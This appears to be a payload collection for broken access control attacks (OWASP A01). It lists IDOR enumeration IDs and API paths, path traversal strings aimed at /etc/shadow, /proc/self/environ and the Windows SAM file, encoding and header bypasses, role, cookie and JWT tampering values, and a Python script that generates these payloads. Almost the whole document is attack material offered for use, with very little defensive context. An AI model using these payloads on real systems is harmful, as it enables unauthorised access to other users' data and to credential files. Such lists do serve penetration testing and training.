# Broken Access Control Payload Library

## Complete Attack Payload Collection

---

## 1. IDOR Payload

### 1.1 User ID Enumeration
```
# Numeric IDs
1, 2, 3, 4, 5, 6, 7, 8, 9, 10
100, 101, 102, 103, 104, 105
1000, 1001, 1002, 1003, 1004, 1005

# String IDs
admin, administrator, root, test, user, guest
ADMIN, ADMINISTRATOR, ROOT, TEST, USER, GUEST
Admin, Administrator, Root, Test, User, Guest

# UUID Format
00000000-0000-0000-0000-000000000000
11111111-1111-1111-1111-111111111111
aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

### 1.2 IDOR URL Patterns
```
# User profiles
/api/v1/users/{id}/profile
/api/v1/users/{id}/details
/api/v1/users/{id}/settings
/api/v1/users/{id}/password
/api/v1/users/{id}/email

# Order information
/api/v1/orders/{id}
/api/v1/orders/{id}/details
/api/v1/orders/{id}/status
/api/v1/orders/{id}/payment

# Documents
/api/v1/documents/{id}
/api/v1/documents/{id}/download
/api/v1/documents/{id}/view
/api/v1/files/{id}

# Messages
/api/v1/messages/{id}
/api/v1/messages/{id}/read
/api/v1/messages/{id}/delete
/api/v1/conversations/{id}

# Organizations
/api/v1/organizations/{id}
/api/v1/organizations/{id}/members
/api/v1/organizations/{id}/settings

# Projects
/api/v1/projects/{id}
/api/v1/projects/{id}/tasks
/api/v1/projects/{id}/files
```

### 1.3 IDOR Parameter Names
```
# Common parameter names
id, user_id, userId, user-id, uid
order_id, orderId, order-id, oid
document_id, documentId, doc-id, did
message_id, messageId, msg-id, mid
file_id, fileId, file-id, fid
project_id, projectId, project-id, pid

# Special parameter names
ref, reference, key, token
account_id, accountId, account-id
customer_id, customerId, customer-id
member_id, memberId, member-id
employee_id, employeeId, employee-id
```

---

## 2. path traversal Payload

### 2.1 Basic Path Traversal
```
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../etc/passwd%00
../../../etc/passwd%00.jpg
....//....//....//etc/passwd
```

### 2.2 Windows Specific
```
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\config\sam
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\boot.ini
..\..\..\..\autoexec.bat
```

### 2.3 URL Encoding Bypass
```
..%252f..%252f..%252fetc/passwd
..%2f..%2f..%2fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

### 2.4 Double Encoding Bypass
```
..%252f..%252f..%252fetc/passwd
..%255c..%255c..%255cetc/passwd
```

### 2.5 Unicode Bypass
```
..%c0%ae%c0%ae%c0%afetc/passwd
..%c1%9c%c1%9c%c1%9cetc/passwd
..%e0%80%ae%e0%80%ae%e0%80%afetc/passwd
```

### 2.6 Overlong Path Bypass
```
.././.././.././.././.././.././.././../etc/passwd
....//....//....//....//....//....//....//....//etc/passwd
```

### 2.7 Special Files
```
# Linux
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../proc/self/environ
../../../proc/self/cmdline
../../../var/log/apache2/access.log
../../../var/log/auth.log

# Windows
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\config\sam
..\..\..\..\windows\repair\sam
..\..\..\..\inetpub\logs\LogFiles\W3SVC1\
```

---

## 3. permissionsBypass Payload

### 3.1 HTTP Method Tampering
```
# Original request
POST /admin/delete_user HTTP/1.1

# Tampered methods
GET /admin/delete_user HTTP/1.1
PUT /admin/delete_user HTTP/1.1
DELETE /admin/delete_user HTTP/1.1
PATCH /admin/delete_user HTTP/1.1
HEAD /admin/delete_user HTTP/1.1
OPTIONS /admin/delete_user HTTP/1.1
```

### 3.2 Parameter Pollution
```
# Parameter duplication
/admin?role=user&role=admin
/profile?is_admin=false&is_admin=true
/api/user?id=1&id=2

# Array parameters
/admin?role[]=user&role[]=admin
/profile?roles[0]=user&roles[1]=admin

# JSON injection
{"role":"user","role":"admin"}
{"role":"user","isAdmin":true}
```

### 3.3 Case Confusion
```
/Admin/Dashboard
/ADMIN/DASHBOARD
/AdMiN/DaShBoArD
/aDmIn/dAsHbOaRd
```

### 3.4 URL Encoding Bypass
```
/%61dmin/%64ashboard
/%41dmin/%44ashboard
/admin%2fdashboard
/admin%dashboard
```

### 3.5 Path Parameter Obfuscation
```
/admin;/dashboard
/admin/./dashboard
/admin/../admin/dashboard
/admin/directory/../dashboard
/admin%00/dashboard
```

### 3.6 Header Tampering
```
# X-Original-URL
X-Original-URL: /admin/delete_user

# X-Rewrite-URL
X-Rewrite-URL: /admin/delete_user

# X-Custom-IP-Authorization
X-Custom-IP-Authorization: 127.0.0.1

# X-Forwarded-For
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost

# X-Real-IP
X-Real-IP: 127.0.0.1
X-Real-IP: localhost

# Referer
Referer: https://trusted.com
Referer: https://target.com/admin

# Origin
Origin: https://trusted.com
```

---

## 4. verticalPrivilege escalation Payload

### 4.1 Direct Admin Endpoint Access
```
/admin
/administrator
/manage
/management
/control
/console
/dashboard
/admin/dashboard
/admin/users
/admin/settings
/admin/config
/admin/logs
/admin/backup
/admin/import
/admin/export
```

### 4.2 Role Parameter Tampering
```
# Query parameters
?role=admin
?role=administrator
?role=superuser
?role=root
?user_type=admin
?access_level=admin
?permission=admin
?is_admin=true
?is_admin=1
?is_admin=yes

# POST parameters
role=admin&username=test
isAdmin=true&userId=123
userRole=administrator
accessLevel=99

# JSON
{"role":"admin"}
{"is_admin":true}
{"userType":"administrator"}
{"permissions":["admin","read","write"]}
```

### 4.3 Cookie Tampering
```
# Cookie values
role=admin
isAdmin=true
user_role=administrator
access_level=99
permissions=admin

# JWT Claims
{
  "role": "admin",
  "isAdmin": true,
  "permissions": ["admin", "read", "write"]
}
```

### 4.4 Session Token Analysis
```
# Predictable tokens
user_token_1
user_token_2
user_token_3
admin_token
session_admin
```

---

## 5. horizontalPrivilege escalation Payload

### 5.1 User ID Modification
```
# URL parameters
?id=1 → ?id=2
?user_id=123 → ?user_id=124
?account=ACC001 → ?account=ACC002

# POST parameters
{"user_id": 123} → {"user_id": 124}
{"account_number": "001"} → {"account_number": "002"}

# Path parameters
/users/1/profile → /users/2/profile
/accounts/001 → /accounts/002
```

### 5.2 Organization ID Modification
```
?org_id=1 → ?org_id=2
?organization_id=100 → ?organization_id=101
?team_id=TEAM001 → ?team_id=TEAM002
```

### 5.3 Resource ID Enumeration
```
# Order IDs
ORD-2024-001
ORD-2024-002
ORD-2024-003
ORD-2024-004
ORD-2024-005

# Invoice IDs
INV-2024-00001
INV-2024-00002
INV-2024-00003

# Documents ID
DOC-20240101-001
DOC-20240101-002
DOC-20240101-003
```

---

## 6. specialBypasstechniques

### 6.1 Time Window Exploitation
```
# Time window between permission check and action execution
1. Request operations (permission check through)
2. quickly modify sessionortokens
3. Execute operations (using modified identity)
```

### 6.2 Race Conditions
```
# Concurrent requests
Thread 1: modify resource（during permission check）
Thread 2: simultaneously access resources
```

### 6.3 Logic Flaws
```
# Race condition
if (user.hasPermission()) {
    // Race window
    performAction();
}

# Multi-step bypass
Step 1: /admin/check (failures)
Step 2: /admin/execute (success，not checked)
```

---

## 7. Automated Payload Generation

### Python Script
```python
#!/usr/bin/env python3
"""
Payload Generator
"""

class PayloadGenerator:
    @staticmethod
    def generate_idor_payloads(base_id, count=10):
        """Generate IDOR Payloads"""
        payloads = []
        
        # Numeric IDs
        for i in range(-count, count + 1):
            if base_id + i > 0:
                payloads.append(str(base_id + i))
        
        # String IDs
        payloads.extend(['admin', 'test', 'root', 'guest'])
        
        return payloads
    
    @staticmethod
    def generate_path_traversal_payloads(depth=5):
        """Generate Path Traversal Payloads"""
        payloads = []
        
        # Basicenumerate
        for i in range(1, depth + 1):
            payloads.append('../' * i + 'etc/passwd')
            payloads.append('..\\' * i + 'windows\\win.ini')
        
        # URL encoding
        for i in range(1, depth + 1):
            payloads.append('..%2f' * i + 'etc/passwd')
            payloads.append('..%252f' * i + 'etc/passwd')
        
        return payloads
    
    @staticmethod
    def generate_role_payloads():
        """Generate Role Tampering Payloads"""
        return [
            {'role': 'admin'},
            {'role': 'administrator'},
            {'is_admin': 'true'},
            {'is_admin': '1'},
            {'user_type': 'admin'},
            {'access_level': '99'},
        ]

# Usage example
gen = PayloadGenerator()

print("IDOR Payloads:")
for payload in gen.generate_idor_payloads(100):
    print(f"  - {payload}")

print("\npath traversal Payloads:")
for payload in gen.generate_path_traversal_payloads():
    print(f"  - {payload}")

print("\nrole tampering Payloads:")
for payload in gen.generate_role_payloads():
    print(f"  - {payload}")
```

---

## 8. Detection Indicators

### 8.1 Success Indicators
```
# Response status codes
200 OK - Possible successful access
201 Created - Resource created successfully
204 No Content - Deletion successful

# Response content
Contains sensitive data of other users
Success message for admin functions
System configuration information
```

### 8.2 Failure Indicators
```
# Response status codes
401 Unauthorized - Not authenticated
403 Forbidden - Permission denied
404 Not Found - Resource not found

# Response content
"Access denied"
"Permission denied"
"Unauthorized access"
"You don't have permission"
```

---

**Document Version**: 1.0
**Payload Count**: 200+
**Last Updated**: 2026-03-26
**Scope**: OWASP Top 10 2025 - A01
